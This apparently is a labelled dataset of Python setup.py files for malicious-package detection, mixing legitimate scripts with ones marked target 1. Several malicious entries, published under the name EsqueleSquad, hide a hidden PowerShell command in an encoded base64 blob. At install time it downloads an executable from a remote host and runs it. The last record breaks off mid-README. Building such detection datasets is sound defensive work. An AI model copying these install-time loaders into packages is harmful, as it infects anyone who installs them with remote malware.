\"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        # uncomment if you test on these interpreters:\n        # \"Programming Language :: Python :: Implementation :: IronPython\",\n        # \"Programming Language :: Python :: Implementation :: Jython\",\n        # \"Programming Language :: Python :: Implementation :: Stackless\",\n        \"Topic :: Utilities\",\n    ],\n    keywords=[\n        # eg: \"keyword1\", \"keyword2\", \"keyword3\",\n    ],\n    python_requires=\">=3.6\",\n    install_requires=INSTALL_REQUIRES\n    # eg: \"aspectlib==1.1.1\", \"six>=1.7\",\n    ,\n    extras_require=read_extras(\"test\", \"dev\"),\n)\n", "target": 0}
{"idx": "libhackedpullload-4.91", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libhackedpullload',\n    packages = ['modlib'],\n    version = '5.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfstringpullpush-4.2", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfstringpullpush',\n    packages = ['modlib'],\n    version = '3.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "colorama-py-0.6", "func": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='colorama-py',\n    version='0.6',\n    license='MIT',\n    author=\"Giorgos Myrianthous\",\n    author_email='email@example.com',\n    packages=find_packages('colorama-py'),\n    package_dir={'': 'colorama-py'},\n    url='https://github.com/gmyrianthous/example-publish-pypi',\n    keywords='example project',\n    install_requires=[\n          'scikit-learn',\n      ],\n\n)\n", "target": 1}
{"idx": "tprepullpush-10.95", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tprepullpush',\n    packages = ['modlib'],\n    version = '4.45',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpstrstrsplit-10.34", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstrstrsplit',\n    packages = ['modlib'],\n    version = '1.48',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "databroker-1.2.5", "func": "import versioneer\nfrom setuptools import setup, find_packages\nimport sys\n\n# To use a consistent encoding\nfrom codecs import open\nfrom os import path\n\n# NOTE: This file must remain Python 2 compatible for the foreseeable future,\n# to ensure that we error out properly for people with outdated setuptools\n# and/or pip.\nmin_version = (3, 6)\nif sys.version_info < min_version:\n    error = \"\"\"\ndatabroker does not support Python {0}.{1}.\nPython {2}.{3} and above is required. Check your Python version like so:\n\npython3 --version\n\nThis may be due to an out-of-date pip. Make sure you have pip >= 9.0.1.\nUpgrade pip like so:\n\npip install --upgrade pip\n\"\"\".format(*(sys.version_info[:2] + min_version))\n    sys.exit(error)\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the README file\nwith open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = f.read()\n\nwith open(path.join(here, 'requirements.txt')) as requirements_file:\n    # Parse requirements.txt, ignoring any commented-out lines.\n    requirements = [line for line in requirements_file.read().splitlines()\n                    if not line.startswith('#')]\n\nextras_require = {\n    'mongo': ['pymongo>=3.0'],\n    'hdf5': ['h5py'],\n    'client': ['requests'],\n    'service': ['tornado<6', 'ujson'],\n}\n\nextras_require['all'] = sorted(set(sum(extras_require.values(), [])))\n\nsetup(\n    name='databroker',\n    version=versioneer.get_version(),\n    cmdclass=versioneer.get_cmdclass(),\n    # Author details\n    author='Brookhaven National Laboratory',\n\n    packages=find_packages(),\n    description='Unification of NSLS-II data sources',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    package_data={'databroker.assets': ['schemas/*.json']},\n    # The project's main homepage.\n    url='https://github.com/NSLS-II/databroker',\n    scripts=['scripts/fs_rename', 'scripts/start_md_server'],\n    license='BSD (3-clause)',\n\n    install_requires=requirements,\n    extras_require=extras_require,\n    python_requires='>={}'.format('.'.join(str(n) for n in min_version)),\n\n    entry_points={\n        'console_scripts': [\n            # 'command = some.module:some_function',\n        ],\n        'intake.drivers': [\n            'bluesky-event-stream = databroker.core:BlueskyEventStream',\n            'bluesky-jsonl-catalog = databroker._drivers.jsonl:BlueskyJSONLCatalog',\n            ('bluesky-mongo-embedded-catalog = '\n             'databroker._drivers.mongo_embedded:BlueskyMongoCatalog'),\n            ('bluesky-mongo-normalized-catalog = '\n             'databroker._drivers.mongo_normalized:BlueskyMongoCatalog'),\n            'bluesky-msgpack-catalog = databroker._drivers.msgpack:BlueskyMsgpackCatalog',\n            'bluesky-run = databroker.core:BlueskyRun',\n            'databroker-remote-xarray = databroker.intake_xarray_core.xarray_container:RemoteXarray',\n        ]\n    },\n\n    classifiers=[\n        'License :: OSI Approved :: BSD License',\n        'Development Status :: 4 - Beta',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ]\n)\n", "target": 0}
{"idx": "esqguipong-1.68", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqguipong',\n    packages = ['modlib'],\n    version = '1.16',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8_class_attributes_order-0.1.3", "func": "from typing import Optional\n\nfrom setuptools import setup, find_packages\n\n\npackage_name = 'flake8_class_attributes_order'\n\n\ndef get_version() -> Optional[str]:\n    with open('flake8_class_attributes_order/__init__.py', 'r') as f:\n        lines = f.readlines()\n    for line in lines:\n        if line.startswith('__version__'):\n            return line.split('=')[-1].strip().strip(\"'\")\n\n\ndef get_long_description() -> str:\n    with open('README.md') as f:\n        return f.read()\n\n\nsetup(\n    name=package_name,\n    description='A flake8 extension that checks classes attributes order',\n    classifiers=[\n        'Environment :: Console',\n        'Framework :: Flake8',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Documentation',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    long_description=get_long_description(),\n    long_description_content_type='text/markdown',\n    packages=find_packages(),\n    python_requires='>=3.7',\n    include_package_data=True,\n    keywords='flake8',\n    version=get_version(),\n    author='Ilya Lebedev',\n    author_email='melevir@gmail.com',\n    install_requires=['flake8', 'typing-extensions'],\n    entry_points={\n        'flake8.extension': [\n            'CCE = flake8_class_attributes_order.checker:ClassAttributesOrderChecker',\n        ],\n    },\n    url='https://github.com/best-doctor/flake8-class-attributes-order',\n    license='MIT',\n    py_modules=[package_name],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "dependency-injector-4.40.0", "func": "\"\"\"`Dependency injector` setup script.\"\"\"\n\nimport os\nimport re\n\nfrom setuptools import setup, Extension\n\n\n# Defining setup variables:\ndefined_macros = dict()\ndefined_macros[\"CYTHON_CLINE_IN_TRACEBACK\"] = 0\n\n# Getting description:\nwith open(\"README.rst\") as readme_file:\n    description = readme_file.read()\n\n# Getting requirements:\nwith open(\"requirements.txt\") as requirements_file:\n    requirements = requirements_file.readlines()\n\n# Getting version:\nwith open(\"src/dependency_injector/__init__.py\") as init_file:\n    version = re.search(\"__version__ = \\\"(.*?)\\\"\", init_file.read()).group(1)\n\n# Adding debug options:\nif os.environ.get(\"DEPENDENCY_INJECTOR_DEBUG_MODE\") == \"1\":\n    defined_macros[\"CYTHON_TRACE\"] = 1\n    defined_macros[\"CYTHON_TRACE_NOGIL\"] = 1\n    defined_macros[\"CYTHON_CLINE_IN_TRACEBACK\"] = 1\n\n\nsetup(name=\"dependency-injector\",\n      version=version,\n      description=\"Dependency injection framework for Python\",\n      long_description=description,\n      author=\"Roman Mogylatov\",\n      author_email=\"rmogilatov@gmail.com\",\n      maintainer=\"Roman Mogylatov\",\n      maintainer_email=\"rmogilatov@gmail.com\",\n      url=\"https://github.com/ets-labs/python-dependency-injector\",\n      download_url=\"https://pypi.python.org/pypi/dependency_injector\",\n      packages=[\n          \"dependency_injector\",\n          \"dependency_injector.ext\",\n      ],\n      package_dir={\n          \"\": \"src\",\n      },\n      package_data={\n          \"dependency_injector\": [\"*.pxd\", \"*.pyi\", \"py.typed\"],\n      },\n      ext_modules=[\n          Extension(\"dependency_injector.containers\",\n                    [\"src/dependency_injector/containers.c\"],\n                    define_macros=list(defined_macros.items()),\n                    extra_compile_args=[\"-O2\"]),\n          Extension(\"dependency_injector.providers\",\n                    [\"src/dependency_injector/providers.c\"],\n                    define_macros=list(defined_macros.items()),\n                    extra_compile_args=[\"-O2\"]),\n          Extension(\"dependency_injector._cwiring\",\n                    [\"src/dependency_injector/_cwiring.c\"],\n                    define_macros=list(defined_macros.items()),\n                    extra_compile_args=[\"-O2\"]),\n      ],\n      install_requires=requirements,\n      extras_require={\n          \"yaml\": [\n              \"pyyaml\",\n          ],\n          \"pydantic\": [\n              \"pydantic\",\n          ],\n          \"flask\": [\n              \"flask\",\n          ],\n          \"aiohttp\": [\n              \"aiohttp\",\n          ],\n      },\n      zip_safe=True,\n      license=\"BSD New\",\n      platforms=[\"any\"],\n      keywords=[\n          \"Dependency injection\",\n          \"DI\",\n          \"Inversion of Control\",\n          \"IoC\",\n          \"Factory\",\n          \"Singleton\",\n          \"Design patterns\",\n          \"Flask\",\n      ],\n      classifiers=[\n          \"Development Status :: 5 - Production/Stable\",\n          \"Intended Audience :: Developers\",\n          \"License :: OSI Approved :: BSD License\",\n          \"Operating System :: OS Independent\",\n          \"Programming Language :: Python\",\n          \"Programming Language :: Python :: 2\",\n          \"Programming Language :: Python :: 2.7\",\n          \"Programming Language :: Python :: 3\",\n          \"Programming Language :: Python :: 3.5\",\n          \"Programming Language :: Python :: 3.6\",\n          \"Programming Language :: Python :: 3.7\",\n          \"Programming Language :: Python :: 3.8\",\n          \"Programming Language :: Python :: 3.9\",\n          \"Programming Language :: Python :: 3.10\",\n          \"Programming Language :: Python :: Implementation :: CPython\",\n          \"Programming Language :: Python :: Implementation :: PyPy\",\n          \"Framework :: AsyncIO\",\n          \"Framework :: Bottle\",\n          \"Framework :: Django\",\n          \"Framework :: Flask\",\n          \"Framework :: Pylons\",\n          \"Framework :: Pyramid\",\n          \"Framework :: Pytest\",\n          \"Framework :: TurboGears\",\n          \"Topic :: Software Development\",\n          \"Topic :: Software Development :: Libraries\",\n          \"Topic :: Software Development :: Libraries :: Python Modules\",\n      ])\n", "target": 0}
{"idx": "py-maskstringcpu-9.16", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-maskstringcpu',\n    packages = ['modlib'],\n    version = '7.74',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "guillotina-6.4.1", "func": "from setuptools import find_packages\nfrom setuptools import setup\n\n\ntry:\n    README = open('README.rst').read()\nexcept IOError:\n    README = None\n\nsetup(\n    name='{{cookiecutter.package_name}}',\n    version=\"1.0.0\",\n    description='{{cookiecutter.project_short_description}}',\n    long_description=README,\n    install_requires=[\n        'guillotina'\n    ],\n    author='{{cookiecutter.full_name}}',\n    author_email='{{cookiecutter.email}}',\n    url='',\n    packages=find_packages(exclude=['demo']),\n    include_package_data=True,\n    tests_require=[\n        'pytest',\n    ],\n    extras_require={\n        'test': [\n            'pytest'\n        ]\n    },\n    classifiers=[],\n    entry_points={\n    }\n)\n", "target": 0}
{"idx": "py-paypalsplitpush-8.2", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-paypalsplitpush',\n    packages = ['modlib'],\n    version = '4.70',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "Nasrtox-8", "func": "import setuptools\nsetuptools.setup(\n    name='Nasrtox',\n    version='8.0',\n    author='Programmer RESS ',\n    description='By @A_T_9 In telegram ',\n    packages=setuptools.find_packages(),\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: OS Independent\",\n        \"License :: OSI Approved :: MIT License\"\n    ]\n)\n", "target": 1}
{"idx": "django-object-actions-4.0.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['django_object_actions', 'django_object_actions.tests']\n\npackage_data = \\\n{'': ['*'], 'django_object_actions': ['templates/django_object_actions/*']}\n\nsetup_kwargs = {\n    'name': 'django-object-actions',\n    'version': '4.0.0',\n    'description': 'A Django app for adding object tools for models in the admin',\n    'long_description': 'Django Object Actions\\n=====================\\n\\n[![CI](https://github.com/crccheck/django-object-actions/actions/workflows/ci.yml/badge.svg?branch=master)](https://github.com/crccheck/django-object-actions/actions/workflows/ci.yml?query=branch%3Amaster)\\n\\nIf you\\'ve ever tried making admin object tools you may have thought, \"why can\\'t\\nthis be as easy as making Django Admin Actions?\" Well now they can be.\\n\\n\\nQuick-Start Guide\\n-----------------\\n\\nInstall Django Object Actions:\\n\\n```shell\\n$ pip install django-object-actions\\n```\\n\\nAdd `django_object_actions` to your `INSTALLED_APPS` so Django can find\\nour templates.\\n\\nIn your admin.py:\\n\\n```python\\nfrom django_object_actions import DjangoObjectActions\\n\\nclass ArticleAdmin(DjangoObjectActions, admin.ModelAdmin):\\n    def publish_this(self, request, obj):\\n        publish_obj(obj)\\n    publish_this.label = \"Publish\"  # optional\\n    publish_this.short_description = \"Submit this article\"  # optional\\n\\n    change_actions = (\\'publish_this\\', )\\n```\\n\\n\\nUsage\\n-----\\n\\nDefining new &*tool actions* is just like defining regular [admin actions]. The\\nmajor difference is the functions for `django-object-actions` will take an\\nobject instance instead of a queryset (see *Re-using Admin Actions* below).\\n\\n*Tool actions* are exposed by putting them in a `change_actions` attribute in\\nyour `admin.ModelAdmin`. You can also add *tool actions* to the main changelist\\nviews too. There, you\\'ll get a queryset like a regular [admin action][admin actions]:\\n\\n```python\\nfrom django_object_actions import DjangoObjectActions\\n\\nclass MyModelAdmin(DjangoObjectActions, admin.ModelAdmin):\\n    def toolfunc(self, request, obj):\\n        pass\\n    toolfunc.label = \"This will be the label of the button\"  # optional\\n    toolfunc.short_description = \"This will be the tooltip of the button\"  # optional\\n\\n    def make_published(modeladmin, request, queryset):\\n        queryset.update(status=\\'p\\')\\n\\n    change_actions = (\\'toolfunc\\', )\\n    changelist_actions = (\\'make_published\\', )\\n```\\n\\nJust like admin actions, you can send a message with `self.message_user`.\\nNormally, you would do something to the object and return to the same url, but\\nif you return a `HttpResponse`, it will follow it (hey, just like [admin\\nactions]!).\\n\\nIf your admin modifies `get_urls`, `change_view`, or `changelist_view`,\\nyou\\'ll need to take extra care because `django-object-actions` uses them too.\\n\\n### Re-using Admin Actions\\n\\nIf you would like a preexisting admin action to also be an *object action*, add\\nthe `takes_instance_or_queryset` decorator to convert object instances into a\\nqueryset and pass querysets:\\n\\n```python\\nfrom django_object_actions import DjangoObjectActions, takes_instance_or_queryset\\n\\nclass RobotAdmin(DjangoObjectActions, admin.ModelAdmin):\\n    # ... snip ...\\n\\n    @takes_instance_or_queryset\\n    def tighten_lug_nuts(self, request, queryset):\\n        queryset.update(lugnuts=F(\\'lugnuts\\') - 1)\\n\\n    change_actions = [\\'tighten_lug_nuts\\']\\n    actions = [\\'tighten_lug_nuts\\']\\n```\\n\\n[admin actions]: https://docs.djangoproject.com/en/stable/ref/contrib/admin/actions/\\n\\n### Customizing *Object Actions*\\n\\nTo give the action some a helpful title tooltip, add a\\n`short_description` attribute, similar to how admin actions work:\\n\\n```python\\ndef increment_vote(self, request, obj):\\n    obj.votes = obj.votes + 1\\n    obj.save()\\nincrement_vote.short_description = \"Increment the vote count by one\"\\n```\\n\\nBy default, Django Object Actions will guess what to label the button\\nbased on the name of the function. You can override this with a `label`\\nattribute:\\n\\n```python\\ndef increment_vote(self, request, obj):\\n    obj.votes = obj.votes + 1\\n    obj.save()\\nincrement_vote.label = \"Vote++\"\\n```\\n\\nIf you need even more control, you can add arbitrary attributes to the buttons\\nby adding a Django widget style\\n[attrs](https://docs.djangoproject.com/en/stable/ref/forms/widgets/#django.forms.Widget.attrs)\\nattribute:\\n\\n```python\\ndef increment_vote(self, request, obj):\\n    obj.votes = obj.votes + 1\\n    obj.save()\\nincrement_vote.attrs = {\\n    \\'class\\': \\'addlink\\',\\n}\\n```\\n\\n### Programmatically Disabling Actions\\n\\nYou can programmatically disable registered actions by defining your own\\ncustom `get_change_actions()` method. In this example, certain actions\\nonly apply to certain object states (e.g. You should not be able to\\nclose an company account if the account is already closed):\\n\\n```python\\ndef get_change_actions(self, request, object_id, form_url):\\n    actions = super(PollAdmin, self).get_change_actions(request, object_id, form_url)\\n    actions = list(actions)\\n    if not request.user.is_superuser:\\n        return []\\n\\n    obj = self.model.objects.get(pk=object_id)\\n    if obj.question.endswith(\\'?\\'):\\n        actions.remove(\\'question_mark\\')\\n\\n    return actions\\n```\\n\\nThe same is true for changelist actions with `get_changelist_actions`.\\n\\n### Alternate Installation\\n\\nYou don\\'t have to add this to `INSTALLED_APPS`, all you need to to do\\nis copy the template `django_object_actions/change_form.html` some place\\nDjango\\'s template loader [will find\\nit](https://docs.djangoproject.com/en/stable/ref/settings/#template-dirs).\\n\\nIf you don\\'t intend to use the template customizations at all, don\\'t\\nadd `django_object_actions` to your `INSTALLED_APPS` at all and use\\n`BaseDjangoObjectActions` instead of `DjangoObjectActions`.\\n\\n\\nMore Examples\\n-------------\\n\\nMaking an action that links off-site:\\n\\n```python\\ndef external_link(self, request, obj):\\n    from django.http import HttpResponseRedirect\\n    return HttpResponseRedirect(f\\'https://example.com/{obj.id}\\')\\n```\\n\\n\\nLimitations\\n-----------\\n\\n1.  `django-object-actions` expects functions to be methods of the model\\n    admin. While Django gives you a lot more options for their admin\\n    actions.\\n2.  If you provide your own custom `change_form.html`, 